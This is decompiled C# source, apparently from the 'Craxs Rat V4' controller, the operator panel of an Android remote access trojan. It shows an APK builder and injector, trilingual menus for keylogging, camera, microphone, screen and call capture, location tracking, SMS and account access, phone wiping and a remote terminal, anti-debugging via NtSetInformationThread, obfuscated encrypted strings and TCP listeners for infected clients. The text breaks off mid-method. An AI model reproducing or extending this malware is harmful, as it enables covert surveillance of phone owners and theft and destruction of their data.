using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Craxs_Rat.My;
using DrakeUI.Framework;
using LiveCharts.Maps;
using LiveCharts.WinForms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Vip.Notification;

namespace Craxs_Rat
{
	// Token: 0x02000094 RID: 148
	[DesignerGenerated]
	public partial class CypherRat : Form
	{
		// Token: 0x0600064B RID: 1611 RVA: 0x00027CC4 File Offset: 0x00025EC4
		public CypherRat()
		{
			base.Load += this.CypherRat_Load;
			base.Closing += this.CypherRat_Closing;
			base.FormClosing += this.CypherRat_FormClosing;
			base.Deactivate += this.CypherRat_Deactivate;
			base.Activated += this.CypherRat_Activated;
			this.gclass7s_0 = new List<GClass7>();
			this.string_1 = "Craxs Rat";
			this.bool_0 = true;
			this.object_0 = null;
			this.string_2 = "";
			this.string_3 = "";
			this.string_4 = "CraxsRatkfvuiorkjty6pajrsnCraxsRatswacecxv";
			this.string_5 = "";
			this.BRTHRRTBSA = "BRTHRRTBSA";
			this.geoMap_0 = new GeoMap();
			this.dictionary_0 = null;
			this.object_1 = 0;
			this.gclass0_0 = null;
			this.string_6 = "32​82​97​116​32​86​52";
			this.object_2 = null;
			this.bool_3 = true;
			this.dataGridViewRows_0 = new List<DataGridViewRow>();
			this.method_1();
		}

		// Token: 0x0600064C RID: 1612
		[DllImport("user32.dll")]
		public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

		// Token: 0x0600064D RID: 1613
		[DllImport("kernel32.dll")]
		public static extern IntPtr OutputDebugString(string lpOutputString);

		// Token: 0x0600064E RID: 1614
		[DllImport("Ntdll.dll")]
		public static extern int NtSetInformationThread(IntPtr intptr_0, int int_5, IntPtr intptr_1, int int_6);

		// Token: 0x0600064F RID: 1615
		[DllImport("kernel32.dll")]
		public static extern IntPtr GetCurrentThread();

		// Token: 0x06000650 RID: 1616 RVA: 0x00027DDC File Offset: 0x00025FDC
		public static int smethod_0()
		{
			CypherRat.int_0 = CypherRat.NtSetInformationThread(CypherRat.GetCurrentThread(), 17, 0, 0);
			int result;
			if (CypherRat.int_0 != 0)
			{
				Interaction.MsgBox("Error : X00101", (MsgBoxStyle)CypherRat.int_0, null);
				Debugger.Break();
				result = 0;
			}
			else
			{
				CypherRat.bool_1 = false;
				result = 1;
			}
			return result;
		}

		// Token: 0x06000651 RID: 1617 RVA: 0x00027E34 File Offset: 0x00026034
		public void method_0()
		{
			string left = Module4.smethod_1();
			if (Operators.CompareString(left, "EN", false) != 0)
			{
				if (Operators.CompareString(left, "AR", false) == 0)
				{
					this.infobox.Text = "معلومات";
					this.SentBox.Text = "الأرسال";
					this.ReciveBox.Text = "التحميل";
					this.RecentBox.Text = "جديد";
					this.infotitlepanel.Text = "الرئيسية";
					this.notifispanel.Text = "اخر التنبيهات";
					this.mappanel.Text = "خريطة الاتصالات";
					this.callspanel.Text = "اخر المكالمات";
					this.Home_Btn.Text = "الرئيسية";
					this.Clients_Btn.Text = "المستخدمين";
					this.blockbtn.Text = "قائمة الحظر";
					this.Connection_btn.Text = "قائمة الاتصالات";
					this.Build_btn.Text = "إنشاء تطبيق";
					this.inject_btn.Text = "حقن تطبيق";
					this.About_btn.Text = "حول البرنامج";
					this.Settings_btn.Text = "إعدادات البرنامج";
					this.ToolTips.SetToolTip(this.Home_Btn, "الرئيسية");
					this.ToolTips.SetToolTip(this.Clients_Btn, "عملاء");
					this.ToolTips.SetToolTip(this.blockbtn, "قائمة الحظر");
					this.ToolTips.SetToolTip(this.Connection_btn, "قائمة الاتصالات");
					this.ToolTips.SetToolTip(this.Build_btn, "إنشاء تطبيق");
					this.ToolTips.SetToolTip(this.inject_btn, "حقن تطبيق");
					this.ToolTips.SetToolTip(this.About_btn, "حول البرنامج");
					this.ToolTips.SetToolTip(this.Settings_btn, "إعدادات البرنامج");
					this.checkall.Text = "تحديد الكل";
					this.searchtext.Watermark = "البحث بالاسم،البلد،العنوان، ...";
				}
				else if (Operators.CompareString(left, "CN", false) == 0)
				{
					this.infobox.Text = "信息";
					this.SentBox.Text = "发了";
					this.ReciveBox.Text = "收到";
					this.RecentBox.Text = "最近";
					this.infotitlepanel.Text = "仪表板";
					this.notifispanel.Text = "最近的通知";
					this.mappanel.Text = "连接图";
					this.callspanel.Text = "最近通话";
					this.Home_Btn.Text = "主页";
					this.Clients_Btn.Text = "客户页面";
					this.blockbtn.Text = "阻止页面";
					this.Connection_btn.Text = "连接页面";
					this.Build_btn.Text = "新应用";
					this.inject_btn.Text = "注入应用程序";
					this.About_btn.Text = "关于";
					this.Settings_btn.Text = "设置";
					this.ToolTips.SetToolTip(this.Home_Btn, "主页");
					this.ToolTips.SetToolTip(this.Clients_Btn, "客户页面");
					this.ToolTips.SetToolTip(this.blockbtn, "阻止页面");
					this.ToolTips.SetToolTip(this.Connection_btn, "连接页面");
					this.ToolTips.SetToolTip(this.Build_btn, "应用程序生成器");
					this.ToolTips.SetToolTip(this.inject_btn, "应用程序注入器");
					this.ToolTips.SetToolTip(this.About_btn, "关于");
					this.ToolTips.SetToolTip(this.Settings_btn, "设置");
					this.checkall.Text = "全选";
					this.searchtext.Watermark = "按名称、国家、地址搜索";
				}
			}
			else
			{
				this.ToolTips.SetToolTip(this.Home_Btn, "Home");
				this.ToolTips.SetToolTip(this.Clients_Btn, "Clients");
				this.ToolTips.SetToolTip(this.blockbtn, "Block List");
				this.ToolTips.SetToolTip(this.Connection_btn, "Connections");
				this.ToolTips.SetToolTip(this.Build_btn, "Build Apk");
				this.ToolTips.SetToolTip(this.inject_btn, "inject Apk");
				this.ToolTips.SetToolTip(this.About_btn, "About");
				this.ToolTips.SetToolTip(this.Settings_btn, "Settings");
			}
			string left2 = Module4.smethod_1();
			if (Operators.CompareString(left2, "AR", false) != 0)
			{
				if (Operators.CompareString(left2, "CN", false) == 0)
				{
					this.DrakeUIContextMenuStrip1.Items[0].Text = "管理";
					ToolStripMenuItem toolStripMenuItem = (ToolStripMenuItem)this.DrakeUIContextMenuStrip1.Items[0];
					toolStripMenuItem.DropDownItems[0].Text = "文件   ";
					toolStripMenuItem.DropDownItems[1].Text = "短信";
					toolStripMenuItem.DropDownItems[2].Text = "来电";
					toolStripMenuItem.DropDownItems[3].Text = "往来";
					toolStripMenuItem.DropDownItems[4].Text = "帐户";
					toolStripMenuItem.DropDownItems[5].Text = "应用";
					toolStripMenuItem.DropDownItems[6].Text = "权限";
					this.DrakeUIContextMenuStrip1.Items[2].Text = "监控";
					ToolStripMenuItem toolStripMenuItem2 = (ToolStripMenuItem)this.DrakeUIContextMenuStrip1.Items[2];
					toolStripMenuItem2.DropDownItems[0].Text = "手机屏幕";
					toolStripMenuItem2.DropDownItems[1].Text = "屏幕阅读器 2";
					toolStripMenuItem2.DropDownItems[2].Text = "相机";
					toolStripMenuItem2.DropDownItems[3].Text = "麦克风";
					toolStripMenuItem2.DropDownItems[4].Text = "键盘记录器";
					toolStripMenuItem2.DropDownItems[5].Text = "地点";
					toolStripMenuItem2.DropDownItems[6].Text = "浏览器";
					toolStripMenuItem2.DropDownItems[7].Text = "通话记录器";
					toolStripMenuItem2.DropDownItems[8].Text = "自动答题器";
					toolStripMenuItem2.DropDownItems[9].Text = "屏幕阅读器";
					this.DrakeUIContextMenuStrip1.Items[4].Text = "行政";
					ToolStripMenuItem toolStripMenuItem3 = (ToolStripMenuItem)this.DrakeUIContextMenuStrip1.Items[4];
					toolStripMenuItem3.DropDownItems[0].Text = "请求管理员权限";
					toolStripMenuItem3.DropDownItems[1].Text = "锁屏";
					toolStripMenuItem3.DropDownItems[2].Text = "擦除手机数据";
					this.DrakeUIContextMenuStrip1.Items[6].Text = "工具";
					ToolStripMenuItem toolStripMenuItem4 = (ToolStripMenuItem)this.DrakeUIContextMenuStrip1.Items[6];
					toolStripMenuItem4.DropDownItems[0].Text = "电话号码";
					toolStripMenuItem4.DropDownItems[1].Text = "安装软件";
					toolStripMenuItem4.DropDownItems[2].Text = "发送通知";
					toolStripMenuItem4.DropDownItems[3].Text = "剪贴板";
					toolStripMenuItem4.DropDownItems[4].Text = "打开链接";
					toolStripMenuItem4.DropDownItems[5].Text = "终端";
					this.DrakeUIContextMenuStrip1.Items[8].Text = "额外的";
					ToolStripMenuItem toolStripMenuItem5 = (ToolStripMenuItem)this.DrakeUIContextMenuStrip1.Items[8];
					toolStripMenuItem5.DropDownItems[0].Text = "通知";
					toolStripMenuItem5.DropDownItems[1].Text = "通话活动";
					toolStripMenuItem5.DropDownItems[2].Text = "社交媒体猎人";
					toolStripMenuItem5.DropDownItems[3].Text = "电话信息";
					this.DrakeUIContextMenuStrip1.Items[10].Text = "联系";
					ToolStripMenuItem toolStripMenuItem6 = (ToolStripMenuItem)this.DrakeUIContextMenuStrip1.Items[10];
					toolStripMenuItem6.DropDownItems[0].Text = "重新连接";
					toolStripMenuItem6.DropDownItems[1].Text = "堵塞";
					toolStripMenuItem6.DropDownItems[2].Text = "禁用反删除";
					toolStripMenuItem6.DropDownItems[3].Text = "自行删除";
					this.DrakeUIContextMenuStrip1.Items[12].Text = "键盘 (beta)";
					this.DrakeUIContextMenuStrip1.Items[14].Text = "客户文件夹";
					return;
				}
			}
			else
			{
				this.DrakeUIContextMenuStrip1.Items[0].Text = "إدارة";
				ToolStripMenuItem toolStripMenuItem7 = (ToolStripMenuItem)this.DrakeUIContextMenuStrip1.Items[0];
				toolStripMenuItem7.DropDownItems[0].Text = "الملفات";
				toolStripMenuItem7.DropDownItems[1].Text = "الرسائل";
				toolStripMenuItem7.DropDownItems[2].Text = "المكالمات";
				toolStripMenuItem7.DropDownItems[3].Text = "الأسماء";
				toolStripMenuItem7.DropDownItems[4].Text = "الحسابات";
				toolStripMenuItem7.DropDownItems[5].Text = "التطبيقات";
				toolStripMenuItem7.DropDownItems[6].Text = "الصلاحيات";
				this.DrakeUIContextMenuStrip1.Items[2].Text = "مراقبة";
				ToolStripMenuItem toolStripMenuItem8 = (ToolStripMenuItem)this.DrakeUIContextMenuStrip1.Items[2];
				toolStripMenuItem8.DropDownItems[0].Text = "شاشة الهاتف";
				toolStripMenuItem8.DropDownItems[1].Text = "قراءة الشاشة 2";
				toolStripMenuItem8.DropDownItems[2].Text = "الكاميرا";
				toolStripMenuItem8.DropDownItems[3].Text = "الميكروفون";
				toolStripMenuItem8.DropDownItems[4].Text = "مسجل المفاتيح";
				toolStripMenuItem8.DropDownItems[5].Text = "الموقع";
				toolStripMenuItem8.DropDownItems[6].Text = "المتصفح";
				toolStripMenuItem8.DropDownItems[7].Text = "مسجل المكالمات";
				toolStripMenuItem8.DropDownItems[8].Text = "شاشة المس";
				toolStripMenuItem8.DropDownItems[9].Text = "قراءة الشاشة";
				this.DrakeUIContextMenuStrip1.Items[4].Text = "مسؤول";
				ToolStripMenuItem toolStripMenuItem9 = (ToolStripMenuItem)this.DrakeUIContextMenuStrip1.Items[4];
				toolStripMenuItem9.DropDownItems[0].Text = "تفعيل مسؤول الجهاز";
				toolStripMenuItem9.DropDownItems[1].Text = "قفل الهاتف";
				toolStripMenuItem9.DropDownItems[2].Text = "حذف ملفات الهاتف";
				this.DrakeUIContextMenuStrip1.Items[6].Text = "أدواة";
				ToolStripMenuItem toolStripMenuItem10 = (ToolStripMenuItem)this.DrakeUIContextMenuStrip1.Items[6];
				toolStripMenuItem10.DropDownItems[0].Text = "إجراء إتصال";
				toolStripMenuItem10.DropDownItems[1].Text = "تثبيت تطبيق";
				toolStripMenuItem10.DropDownItems[2].Text = "إرسال تنبيه";
				toolStripMenuItem10.DropDownItems[3].Text = "الحافظة";
				toolStripMenuItem10.DropDownItems[4].Text = "فتح موقع";
				toolStripMenuItem10.DropDownItems[5].Text = "موجه الأوامر";
				this.DrakeUIContextMenuStrip1.Items[8].Text = "المزيد";
				ToolStripMenuItem toolStripMenuItem11 = (ToolStripMenuItem)this.DrakeUIContextMenuStrip1.Items[8];
				toolStripMenuItem11.DropDownItems[0].Text = "إشعارات الهاتف";
				toolStripMenuItem11.DropDownItems[1].Text = "المكالمات الحالية";
				toolStripMenuItem11.DropDownItems[2].Text = "إكتشاف مواقع التواصل";
				toolStripMenuItem11.DropDownItems[3].Text = "معلومات الهاتف";
				this.DrakeUIContextMenuStrip1.Items[10].Text = "الإتصال";
				ToolStripMenuItem toolStripMenuItem12 = (ToolStripMenuItem)this.DrakeUIContextMenuStrip1.Items[10];
				toolStripMenuItem12.DropDownItems[0].Text = "إعادة الأتصال";
				toolStripMenuItem12.DropDownItems[1].Text = "حظر المستخدم";
				toolStripMenuItem12.DropDownItems[2].Text = "إيقاف منع الحذف";
				toolStripMenuItem12.DropDownItems[3].Text = "حذف التطبيق";
				this.DrakeUIContextMenuStrip1.Items[12].Text = "لوحة المفاتيح (beta)";
				this.DrakeUIContextMenuStrip1.Items[14].Text = "ملفات المستخدم";
			}
		}

		// Token: 0x06000652 RID: 1618 RVA: 0x00028B8C File Offset: 0x00026D8C
		public void method_1()
		{
			Thread thread = new Thread((CypherRat.Class8.threadStart_0 != null) ? CypherRat.Class8.threadStart_0 : (CypherRat.Class8.threadStart_0 = new ThreadStart(CypherRat.Class8.class8_0.method_0)));
			thread.IsBackground = true;
			thread.SetApartmentState(ApartmentState.STA);
			thread.Start();
			if (!Module2.smethod_45())
			{
				new nonetform().ShowDialog();
				Environment.Exit(0);
			}
			this.method_146();
			Module4.smethod_0();
			if (Conversions.ToBoolean(Operators.NotObject(Module2.smethod_6())))
			{
				Interaction.MsgBox("Error Reg Config", MsgBoxStyle.OkOnly, null);
				Environment.Exit(0);
			}
			if (Module4.smethod_1() == null)
			{
				LanguageSelector languageSelector = new LanguageSelector();
				languageSelector.ShowDialog();
				string left = languageSelector.string_0;
				if (Operators.CompareString(left, "AR", false) != 0)
				{
					if (Operators.CompareString(left, "EN", false) == 0)
					{
						Module4.smethod_2("EN");
					}
					else if (Operators.CompareString(left, "CN", false) != 0)
					{
						Module4.smethod_2("EN");
					}
					else
					{
						Module4.smethod_2("CN");
					}
				}
				else
				{
					Module4.smethod_2("AR");
				}
			}
			this.method_0();
			this.gclass0_0 = new GClass0();
			GClass9.cypherRat_0 = this;
		}

		// Token: 0x06000653 RID: 1619 RVA: 0x00028CA4 File Offset: 0x00026EA4
		private void method_2()
		{
			this.notfi.Visible = true;
		}

		// Token: 0x06000654 RID: 1620 RVA: 0x0000246D File Offset: 0x0000066D
		private void method_3()
		{
		}

		// Token: 0x06000655 RID: 1621 RVA: 0x00028CC0 File Offset: 0x00026EC0
		private void TOpacity_Tick(object sender, EventArgs e)
		{
			if (base.Opacity == 1.0)
			{
				this.TOpacity.Enabled = false;
			}
			else
			{
				base.Opacity += 0.1;
			}
		}

		// Token: 0x06000656 RID: 1622 RVA: 0x00028D08 File Offset: 0x00026F08
		private Task method_5()
		{
			while (this.gclass7s_0 == null)
			{
				Thread.Sleep(100);
			}
			return null;
		}

		// Token: 0x06000657 RID: 1623 RVA: 0x00028D30 File Offset: 0x00026F30
		private void method_6(object object_26, MapData mapData_0)
		{
			Point position = Cursor.Position;
			checked
			{
				position.Y += (int)Math.Round(unchecked((double)this.Cursor.Size.Height * 1.5));
				this.ToolTips.Show(mapData_0.Name, this, base.PointToClient(position), 3000);
			}
		}

		// Token: 0x06000658 RID: 1624 RVA: 0x00028D94 File Offset: 0x00026F94
		private void CypherRat_Load(object sender, EventArgs e)
		{
			CypherRat.Class9 @class = new CypherRat.Class9();
			@class.cypherRat_0 = this;
			@class.object_0 = sender;
			@class.eventArgs_0 = e;
			@class.int_0 = -1;
			@class.asyncVoidMethodBuilder_0 = AsyncVoidMethodBuilder.Create();
			@class.asyncVoidMethodBuilder_0.Start<CypherRat.Class9>(ref @class);
		}

		// Token: 0x06000659 RID: 1625 RVA: 0x00028DDC File Offset: 0x00026FDC
		private string method_9()
		{
			try
			{
				string text = null;
				string s = "api=" + Module2.smethod_60("grMsY9EDshbal9CicGB3gCnDrr53UquIyc3GQ2WWl+o=", "8526419738465294");
				WebRequest webRequest = WebRequest.Create(string.Concat(new string[]
				{
					Module2.smethod_60("zDFkvjTYv+5B+cvMfTk+eOI5jgkniXxPVkZx18SSgX45KX1APeB9iBsaj+PFv/9w", "3164972864529158"),
					"?USR=",
					GClass0.smethod_2(GClass0.smethod_0() + GClass0.smethod_1()),
					"&IDF=",
					Module2.smethod_59(GClass0.smethod_2(GClass0.smethod_0() + GClass0.smethod_1()), "Form1"),
					"&H=",
					Module2.smethod_59(Conversions.ToString(Module2.smethod_3(Application.ExecutablePath)), "ZoomPictureBox"),
					"&E=",
					Module2.smethod_58(text, "​‍‌‎‏")
				}));
				webRequest.Method = "POST";
				byte[] bytes = Encoding.UTF8.GetBytes(s);
				webRequest.ContentType = "application/x-www-form-urlencoded";
				webRequest.ContentLength = (long)bytes.Length;
				Stream requestStream = webRequest.GetRequestStream();
				requestStream.Write(bytes, 0, bytes.Length);
				requestStream.Close();
				WebResponse response = webRequest.GetResponse();
				Stream responseStream = response.GetResponseStream();
				StreamReader streamReader = new StreamReader(responseStream);
				string text2 = streamReader.ReadToEnd();
				streamReader.Close();
				responseStream.Close();
				response.Close();
				if (text2.StartsWith("K"))
				{
					return Module2.smethod_60(text2.Replace("K:", ""), Module2.smethod_58("y56OGJfQfQ7JFCyqoUShqb1JE3VkiZEsR/27mTdmgB4=", "9528461379528461"));
				}
			}
			catch (Exception)
			{
			}
			return null;
		}

		// Token: 0x0600065A RID: 1626 RVA: 0x00028F74 File Offset: 0x00027174
		private string method_10(string string_0, int int_5, string string_1, string[] strings_0)
		{
			foreach (string text in strings_0)
			{
				if (!string.IsNullOrEmpty(text))
				{
					this.string_0 = this.string_0 + text + ",";
					this.gclass7s_0.Add(new GClass7(text));
				}
			}
			this.Label1.Text = "Craxs Rat V4";
			return "H";
		}

		// Token: 0x0600065B RID: 1627 RVA: 0x00028FE0 File Offset: 0x000271E0
		internal static string smethod_1(bool bool_4)
		{
			return "KD";
		}

		// Token: 0x0600065C RID: 1628 RVA: 0x00028FF4 File Offset: 0x000271F4
		public void method_11()
		{
			Color left = this.method_12(154, "Typs", CypherRat.int_0);
			if (!(left == Color.Green))
			{
				this.method_16();
			}
		}

		// Token: 0x0600065D RID: 1629 RVA: 0x0002902C File Offset: 0x0002722C
		private Color method_12(int int_5, string string_0, int int_6)
		{
			checked
			{
				Color green;
				if (int_5 >= 100)
				{
					int_5 -= 100;
					int num = CypherRat.smethod_0();
					if (num == 1)
					{
						green = Color.Green;
					}
					else if (num == 0)
					{
						this.method_16();
					}
				}
				return green;
			}
		}

		// Token: 0x0600065E RID: 1630 RVA: 0x0002906C File Offset: 0x0002726C
		public void method_13()
		{
			string left = this.method_32();
			if (Operators.CompareString(left, "Moreinfo", false) != 0)
			{
				base.Close();
			}
		}

		// Token: 0x0600065F RID: 1631 RVA: 0x00029098 File Offset: 0x00027298
		private string method_14(int int_5)
		{
			string result;
			if (int_5 > 0)
			{
				result = Module2.smethod_58("8NCuc0D5WsLlKEdw+NbtoA==", GClass9.string_7);
			}
			else
			{
				result = null;
			}
			return result;
		}

		// Token: 0x06000660 RID: 1632 RVA: 0x000055AE File Offset: 0x000037AE
		private void CypherRat_Closing(object sender, CancelEventArgs e)
		{
			this.method_16();
		}

		// Token: 0x06000661 RID: 1633 RVA: 0x000290C0 File Offset: 0x000272C0
		public void method_16()
		{
			checked
			{
				try
				{
					this.notfi.Visible = false;
					if (this.gclass7s_0 != null)
					{
						int num = this.gclass7s_0.Count - 1;
						for (int i = 0; i <= num; i++)
						{
							try
							{
								this.gclass7s_0[i].tcpListener_0.Stop();
								this.gclass7s_0[i].tcpListener_0.Server.Close();
							}
							catch (Exception ex)
							{
							}
						}
					}
				}
				catch (Exception ex2)
				{
				}
				Application.ExitThread();
				Application.Exit();
			}
		}

		// Token: 0x06000662 RID: 1634 RVA: 0x0002917C File Offset: 0x0002737C
		private void notfi_MouseClick(object sender, MouseEventArgs e)
		{
			if (e.Button == MouseButtons.Left)
			{
				if (base.WindowState > FormWindowState.Normal)
				{
					base.WindowState = FormWindowState.Normal;
				}
				base.TopMost = true;
				base.TopMost = false;
			}
		}

		// Token: 0x06000663 RID: 1635 RVA: 0x000291B8 File Offset: 0x000273B8
		private void method_18(object sender, EventArgs e)
		{
			if (this.build_0 == null)
			{
				this.build_0 = new Build();
				DialogResult dialogResult = this.build_0.ShowDialog(this);
				if (dialogResult != DialogResult.OK)
				{
					this.build_0.Close();
					this.build_0 = null;
				}
				else
				{
					this.build_0.Close();
					this.build_0 = null;
				}
			}
		}

		// Token: 0x06000664 RID: 1636 RVA: 0x000055AE File Offset: 0x000037AE
		private void method_19(object sender, EventArgs e)
		{
			this.method_16();
		}

		// Token: 0x06000665 RID: 1637 RVA: 0x00029214 File Offset: 0x00027414
		public void method_20()
		{
			this.object_1 = Operators.AddObject(this.object_1, 1);
			this.backgroundWorkers_0 = new BackgroundWorker[checked(Conversions.ToInteger(this.object_1) + 1)];
			this.backgroundWorkers_0[Conversions.ToInteger(this.object_1)] = new BackgroundWorker();
			this.backgroundWorkers_0[Conversions.ToInteger(this.object_1)].WorkerReportsProgress = true;
			this.backgroundWorkers_0[Conversions.ToInteger(this.object_1)].WorkerSupportsCancellation = true;
			this.backgroundWorkers_0[Conversions.ToInteger(this.object_1)].DoWork += this.BackgroundWorker_DoWork;
			this.backgroundWorkers_0[Conversions.ToInteger(this.object_1)].RunWorkerAsync();
		}

		// Token: 0x06000666 RID: 1638 RVA: 0x000292D4 File Offset: 0x000274D4
		private void BackgroundWorker_DoWork(object sender, DoWorkEventArgs e)
		{
			this.ports_0.method_1(new object[]
			{
				Module2.smethod_58("yEJUEu5udHzKaZEEOF8BDZdITg4+sPMbLWk3r2pmdHg=", "App Data")
			});
			Thread.Sleep(1000);
			if (!Module2.smethod_45())
			{
				nonetform nonetform = new nonetform();
				nonetform.ShowDialog();
				Environment.Exit(0);
			}
			this.ports_0.method_1(new object[]
			{
				Module2.smethod_58("k4THs+x+aGgYLg7AJm7XVQ==", GClass9.string_7)
			});
			this.method_13();
		}

		// Token: 0x06000667 RID: 1639 RVA: 0x00029354 File Offset: 0x00027554
		public void method_22(object[] objects_0)
		{
			if (!this.DataLog.InvokeRequired)
			{
				Image image = (Image)objects_0[0];
				string text = Conversions.ToString(objects_0[1]);
				string text2 = Conversions.ToString(objects_0[2]);
				string text3 = Conversions.ToString(objects_0[3]);
				if (this.DataLog.Rows.Count > 25)
				{
					this.DataLog.Rows.Clear();
				}
				this.DataLog.Rows.Add(new object[]
				{
					image,
					text,
					text2,
					text3,
					DateAndTime.Now.ToShortTimeString().ToString()
				});
			}
			else
			{
				CypherRat.GDelegate8 method = new CypherRat.GDelegate8(this.method_22);
				this.DataLog.Invoke(method, new object[]
				{
					objects_0
				});
			}
		}

		// Token: 0x06000668 RID: 1640 RVA: 0x00029420 File Offset: 0x00027620
		public void method_23(object[] objects_0)
		{
			if (this.DGVNOTF.InvokeRequired)
			{
				CypherRat.GDelegate9 method = new CypherRat.GDelegate9(this.method_23);
				this.DGVNOTF.Invoke(method, new object[]
				{
					objects_0
				});
			}
			else
			{
				Image image = (Image)objects_0[0];
				string text = Conversions.ToString(objects_0[1]);
				if (this.DGVNOTF.Rows.Count >= 9)
				{
					this.DGVNOTF.Rows.Remove(this.DGVNOTF.Rows[0]);
				}
				this.DGVNOTF.Rows.Add(new object[]
				{
					image,
					text
				});
			}
		}

		// Token: 0x06000669 RID: 1641 RVA: 0x000294CC File Offset: 0x000276CC
		public void method_24(object[] objects_0)
		{
			if (this.DGVCALLS.InvokeRequired)
			{
				CypherRat.GDelegate10 method = new CypherRat.GDelegate10(this.method_24);
				this.DGVCALLS.Invoke(method, new object[]
				{
					objects_0
				});
			}
			else
			{
				Image image = (Image)objects_0[0];
				string text = Conversions.ToString(objects_0[1]);
				if (this.DGVCALLS.Rows.Count >= 9)
				{
					this.DGVCALLS.Rows.Remove(this.DGVCALLS.Rows[0]);
				}
				this.DGVCALLS.Rows.Add(new object[]
				{
					image,
					text
				});
			}
		}

		// Token: 0x0600066A RID: 1642 RVA: 0x00029578 File Offset: 0x00027778
		public void method_25(object[] objects_0)
		{
			if (!base.InvokeRequired)
			{
				string message = Conversions.ToString(objects_0[0]);
				Image image = (Image)objects_0[1];
				object obj = objects_0[2];
				Color color = (obj == null) ? default(Color) : ((Color)obj);
				Alert.ShowCustom(message, true, image, color);
			}
			else
			{
				CypherRat.GDelegate11 method = new CypherRat.GDelegate11(this.method_25);
				base.Invoke(method, new object[]
				{
					objects_0
				});
			}
		}

		// Token: 0x0600066B RID: 1643 RVA: 0x000295E4 File Offset: 0x000277E4
		public void method_26(GClass8 gclass8_0)
		{
			try
			{
			}
			catch (Exception ex)
			{
			}
			try
			{
				foreach (object obj in Application.OpenForms)
				{
					Form form = (Form)obj;
					try
					{
						if (form != null && form.Tag != null)
						{
							CameraManager cameraManager = new CameraManager();
							if (Operators.CompareString(form.Tag.ToString(), "Cam_" + gclass8_0.string_9, false) == 0)
							{
								cameraManager = (CameraManager)form;
								cameraManager.Name = "Camera_Manager_" + gclass8_0.string_2;
								cameraManager.Tag = "Cam_" + gclass8_0.string_9;
								if (Operators.CompareString(cameraManager.string_4, "null", false) != 0)
								{
									cameraManager.gclass8_2 = gclass8_0;
									cameraManager.tcpClient_1 = gclass8_0.tcpClient_0;
									cameraManager.tcpClient_0 = gclass8_0.tcpClient_0;
									cameraManager.string_0 = string.Format("{0} - IP:{1}", "Camera Manager", gclass8_0.string_1);
									cameraManager.gclass8_1 = gclass8_0;
									cameraManager.method_12(cameraManager.string_4);
									cameraManager.statustext.Text = Conversions.ToString(Module2.smethod_17("rOiQJAyoD0SMW/s++ZHZJYdqJdSW71pM6ym/o8gPvSk="));
									cameraManager.CAM0.Image = Module0.loading_please_wait;
								}
								else
								{
									cameraManager.gclass8_2 = gclass8_0;
									cameraManager.string_0 = string.Format("{0} - IP:{1}", "Camera Manager", gclass8_0.string_1);
									if (cameraManager.gclass8_2 != null)
									{
										Module8.smethod_5(cameraManager.gclass8_2);
										cameraManager.string_2 = MyProject.Forms.CameraManager.gclass8_2.string_10;
									}
									cameraManager.tcpClient_1 = cameraManager.gclass8_2.tcpClient_0;
									cameraManager.tcpClient_0 = cameraManager.gclass8_2.tcpClient_0;
									cameraManager.gclass8_0 = gclass8_0;
									cameraManager.gclass8_1 = gclass8_0;
									MyProject.Forms.CameraManager.pictureBox_0 = new PictureBox();
								}
							}
						}
					}
					catch (Exception ex2)
					{
					}
					try
					{
						if (form != null && form.Tag != null && Operators.CompareString(form.Tag.ToString(), "screen_" + gclass8_0.string_9, false) == 0)
						{
							ScreenShoter screenShoter = (ScreenShoter)form;
							if (screenShoter != null)
							{
								screenShoter.method_23(new object[]
								{
									"Client Ready..."
								});
								screenShoter.Livepicbox.Image = null;
								screenShoter.StartButton.Enabled = true;
								screenShoter.StopButton.Enabled = false;
								screenShoter.bool_0 = false;
							}
						}
					}
					catch (Exception ex3)
					{
					}
					try
					{
						if (form != null && form.Tag != null && Operators.CompareString(form.Tag.ToString(), "File" + gclass8_0.string_9, false) == 0)
						{
							FileManager fileManager = (FileManager)form;
							fileManager.Tag = "File" + gclass8_0.string_9;
							fileManager.Name = "File_Manager_File" + gclass8_0.string_9;
							fileManager.string_0 = string.Format("{0} - ID:{1}", "File Manager", gclass8_0.string_9);
							fileManager.Text = string.Format("{0} - ID:{1}", "File Manager", gclass8_0.string_9);
							fileManager.object_0 = gclass8_0.tcpClient_0;
							fileManager.gclass8_0 = gclass8_0;
							fileManager.string_1 = gclass8_0.string_13;
							fileManager.DGV0.AutoGenerateColumns = false;
							fileManager.DGV0.Columns[5].DisplayIndex = 0;
							fileManager.viwimage.Image = null;
							break;
						}
					}
					catch (Exception ex4)
					{
					}
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}

		// Token: 0x0600066C RID: 1644 RVA: 0x00029A48 File Offset: 0x00027C48
		public string method_27(string string_0)
		{
			string[] array = string_0.Replace("​", " ").Split(new char[]
			{
				' '
			});
			string text = "";
			foreach (string text2 in array)
			{
				if (text2.Length > 0)
				{
					text += Conversions.ToString(Strings.Chr(Convert.ToInt32(text2)));
				}
			}
			return text;
		}

		// Token: 0x0600066D RID: 1645 RVA: 0x00029AC0 File Offset: 0x00027CC0
		public void method_28(object[] objects_0)
		{
			if (!this.ClientsWindow.InvokeRequired)
			{
				DataGridViewRow dataGridViewRow = null;
				try
				{
					GClass8 gclass = (GClass8)objects_0[0];
					string[] array = gclass.string_0.Split(new char[]
					{
						':'
					});
					int index = 0;
					index = this.ClientsWindow.Rows.Add(new object[]
					{
						Module8.smethod_27(gclass.string_4),
						gclass.objects_1[0],
						gclass.image_0,
						gclass.string_8,
						gclass.string_6,
						gclass.string_1 + ":" + array[1],
						gclass.string_7,
						gclass.object_4,
						Module2.smethod_29(),
						Module2.smethod_29(),
						Module8.smethod_24(gclass.string_5),
						gclass.object_5,
						"",
						gclass.object_3,
						Module8.smethod_0(gclass.bool_12),
						gclass.string_11
					});
					object obj = GClass9.object_0;
					ObjectFlowControl.CheckForSyncLockOnValueType(obj);
					lock (obj)
					{
						if (Operators.CompareString(this.Label1.Text, this.method_27("67​114​97​120​115​​" + this.string_6), false) == 0)
						{
							gclass.dataGridViewRow_0 = this.ClientsWindow.Rows[index];
						}
					}
					try
					{
